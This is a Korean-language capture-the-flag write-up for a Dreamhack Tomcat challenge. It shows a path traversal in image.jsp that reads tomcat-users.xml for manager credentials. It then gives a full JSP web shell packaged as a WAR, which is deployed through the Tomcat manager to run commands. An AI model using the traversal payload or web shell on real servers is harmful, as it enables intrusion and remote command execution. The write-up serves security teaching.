# Tomcat Manager

[문제 링크](https://dreamhack.io/wargame/challenges/248)

## 문제 분석

이 문제는 Apache Tomcat 기반 환경에서 구동되는 웹 애플리케이션으로, 이미지 조회 기능을 통해 임의 파일을 읽어오는 취약점과 톰캣 관리자 페이지의 WAR 배포 기능을 연계하여 원격 명령을 실행하고 플래그를 획득하는 구조입니다.

문제 환경에서 제공된 `Dockerfile`과 `tomcat-users.xml` 설정 파일의 내용은 다음과 같습니다.

```dockerfile
FROM tomcat:8.0.51-jre7-alpine

ENV RUN_USER tomcat
ENV RUN_GROUP tomcat

RUN addgroup ${RUN_GROUP} && adduser -G ${RUN_GROUP} -D -h ${CATALINA_HOME} ${RUN_USER}
RUN chown -R tomcat:tomcat $CATALINA_HOME
RUN ls -lah $CATALINA_HOME

RUN rm -rf /usr/local/tomcat/webapps/ROOT/
COPY flag /flag
COPY ROOT.war /usr/local/tomcat/webapps/ROOT.war
COPY tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml

USER tomcat
EXPOSE 8080
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

    <role rolename="manager-gui"/>
    <role rolename="manager-script"/>
    <role rolename="manager-jmx"/>
    <role rolename="manager-status"/>
    <role rolename="admin-gui"/>
    <role rolename="admin-script"/>
    <user username="tomcat" password="[**SECRET**]" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />  
</tomcat-users>
```

`Dockerfile`을 확인하면 플래그가 루트 디렉터리인 `/flag`에 위치하며, `tomcat-users.xml` 파일이 `/usr/local/tomcat/conf/` 디렉터리에 복사됩니다. `tomcat-users.xml` 파일에는 `tomcat` 유저에게 `manager-gui`를 포함한 관리자 역할이 부여되어 있으나 패스워드는 임의의 값으로 은닉되어 있습니다.

애플리케이션 접속 시 이미지 파일을 로드하는 `image.jsp`의 디컴파일 코드는 다음과 같습니다.

```jsp
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*" %>
<%
    String filepath = getServletContext().getRealPath("resources") + "/";
    String _file = request.getParameter("file");

    if (_file != null) {
        File file = new File(filepath + _file);
        if (file.exists()) {
            FileInputStream fileInputStream = new FileInputStream(file);
            ServletOutputStream servletOutputStream = response.getOutputStream();
            
            byte[] buffer = new byte[1024];
            int length;
            while ((length = fileInputStream.read(buffer)) > 0) {
                servletOutputStream.write(buffer, 0, length);
            }
            
            fileInputStream.close();
            servletOutputStream.flush();
            servletOutputStream.close();
        }
    }
%>
```

---

## 취약점 분석

### 1. `image.jsp`의 Path Traversal (Arbitrary File Read)

`image.jsp`는 `file` 파라미터로 입력받은 값을 `filepath`(`/usr/local/tomcat/webapps/ROOT/resources/`) 뒤에 단순 연결하여 `File` 객체를 생성합니다.

입력값에 대한 상위 디렉터리 이동 문자열(`../`) 검증이 존재하지 않으므로, 공격자는 경로 순회를 통해 웹 루트 외부의 시스템 파일에 접근할 수 있습니다. 

기준 위치가 `/usr/local/tomcat/webapps/ROOT/resources/`이므로 상위 경로로 4번 이동(`../../../../`)하거나 최상위 루트에 도달할 만큼 충분한 개수의 `../`를 입력하면 `/usr/local/tomcat/conf/tomcat-users.xml` 파일의 내용을 직접 읽어올 수 있습니다. 이를 통해 관리자 계정인 `tomcat`의 실제 패스워드가 노출됩니다.

### 2. Tomcat Manager의 WAR File Deploy를 통한 RCE

획득한 `tomcat` 계정의 권한에는 웹 관리자 페이지에 접근할 수 있는 `manager-gui` 역할이 포함되어 있습니다.

톰캣의 관리자 콘솔(`/manager/html`)은 웹 애플리케이션을 배포할 수 있는 `WAR file to deploy` 기능을 제공합니다. 관리자 권한을 가진 사용자는 명령 실행 코드가 포함된 JSP 웹셸을 `.war` 아카이브로 묶어 서버에 업로드할 수 있으며, 톰캣은 이를 자동으로 웹 애플리케이션으로 압축 해제하여 배포합니다. 배포된 컨텍스트에 접근하면 웹 애플리케이션 권한으로 임의의 시스템 명령어를 실행할 수 있습니다.

---

## 익스플로잇

### 1. `tomcat-users.xml` 탈취를 통한 패스워드 획득

`image.jsp`의 `file` 파라미터에 Path Traversal 페이로드를 전달하여 톰캣 계정 설정 파일을 요청합니다.

```text
http://host3.dreamhack.games:포트번호/image.jsp?file=../../../../usr/local/tomcat/conf/tomcat-users.xml
```

응답 본문에서 `password` 속성에 설정된 실제 평문 패스워드를 획득합니다.

```xml
<user username="tomcat" password="[획득한_패스워드]" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
```

### 2. JSP 웹셸 작성 및 WAR 패키징

명령어 실행을 처리할 `cmd.jsp` 파일을 작성합니다.

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        out.println("<pre>");
        while (disr != null) {
            out.println(disr);
            disr = dis.readLine();
        }
        out.println("</pre>");
    }
%>
```

JDK의 `jar` 명령어를 사용하여 `cmd.jsp`를 `shell.war` 파일로 아카이브합니다.

```bash
jar -cvf shell.war cmd.jsp
```

### 3. Tomcat Manager 로그인 및 WAR 배포

1. 브라우저를 통해 `http://host3.dreamhack.games:포트번호/manager/html` 경로에 접속합니다.
2. HTTP Basic 인증 프롬프트에 앞서 획득한 아이디(`tomcat`)와 패스워드를 입력하여 로그인합니다.
3. 관리자 페이지 내 **WAR file to deploy** 섹션에서 생성한 `shell.war` 파일을 선택하고 `Deploy` 버튼을 클릭합니다.
4. 배포가 완료되면 애플리케이션 목록에 `/shell` 컨텍스트가 등록됩니다.

### 4. 플래그 획득

배포된 웹셸 경로로 접근하여 `cmd` 파라미터에 `/flag` 명령어를 전달합니다.

```text
http://host3.dreamhack.games:포트번호/shell/cmd.jsp?cmd=/flag
```

실행 결과로 출력된 플래그(`DH{...}`)를 확인합니다.
